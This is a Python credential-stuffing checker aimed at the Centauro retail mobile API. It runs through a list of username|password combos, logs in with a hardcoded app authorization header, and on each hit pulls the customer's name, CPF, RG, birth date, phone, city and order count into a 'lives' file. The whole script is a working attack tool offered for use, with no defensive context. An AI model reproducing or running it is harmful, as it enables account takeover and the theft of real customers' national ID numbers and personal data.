# SCRIPT BY KAISER
# https://github.com/KaiserD3V/
import requests
import colorama
from time import sleep
from colorama import Fore, Style
colorama.init()

a = open("lista.txt", "r", encoding="utf8")
file = [s.strip() for s in a.readlines()]
for lines in file:
    combo = lines.split('|')
    sleep(0.5)
    h = {'Host': 'api.centauro.appsbnet.com.br','x-client-UserAgent': 'android','x-cv-id': '14','Authorization': 'Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','Content-Type': 'application/json; charset=UTF-8','Connection': 'Keep-Alive'}
    p = {"usuario":combo[0],"senha":combo[1],"ManterLogado":"true"}
    r = requests.post('https://api.centauro.appsbnet.com.br/v2.1/clientes/login',headers=h,json=p)
    if r.status_code == 200:
        tokin = r.json()
        token = tokin["token"]
        h2 = {'Host': 'api.centauro.appsbnet.com.br','x-client-UserAgent': 'android','x-cv-id': '14','Authorization': 'Basic TW9iaWxlQXBwTTpjN2I1OTJhNg==','x-client-token': token,'Content-Type': 'application/json; charset=UTF-8','Connection': 'Keep-Alive'}
        r2 = requests.get('https://api.centauro.appsbnet.com.br/v3/clientes',headers=h2).json()
        cidade = r2["endereco"]["cidade"]
        estado = r2["endereco"]["estado"]
        ddd = r2["endereco"]["telefoneAdicional"]["ddd"]
        num = r2["endereco"]["telefoneAdicional"]["numero"]
        nome = r2["endereco"]["nomeDeQuemIraReceber"]
        sobren = r2["sobrenome"]
        sex = r2["sexo"]
        cpf = r2["cpf"]
        rg = r2["rg"]
        nasci = r2["dataDeNascimento"]
        
        r3 = requests.get('https://api.centauro.appsbnet.com.br/v2.1/clientes/pedidos?quantidade=10&pular=0',headers=h2).json()
        pedidos = r3["quantidadeTotalPedidos"]
        
        print('')
        print(Fore.GREEN + f"LIVE(!): {combo[0]}|{combo[1]} » Nome: {nome} » Sexo: {sex} » CPF: {cpf} » RG: {rg} » Data De Nascimento: {nasci} » Celular: Celular: ({ddd}) {num} » Cidade: {cidade} - {estado} » Pedidos: {pedidos}")
        print(Style.RESET_ALL)
        f = open("lives.txt", "a", encoding="utf8")
        f.write(f"{combo[0]}|{combo[1]} » Nome: {nome} » Sexo: {sex} » CPF: {cpf} » RG: {rg} » Data De Nascimento: {nasci} » Celular: ({ddd}) {num} » Cidade: {cidade} - {estado} » Pedidos: {pedidos}\n\n")
        f.close()
    else:
        print(Fore.RED + f'Login Inválido! Erro: {r.status_code}')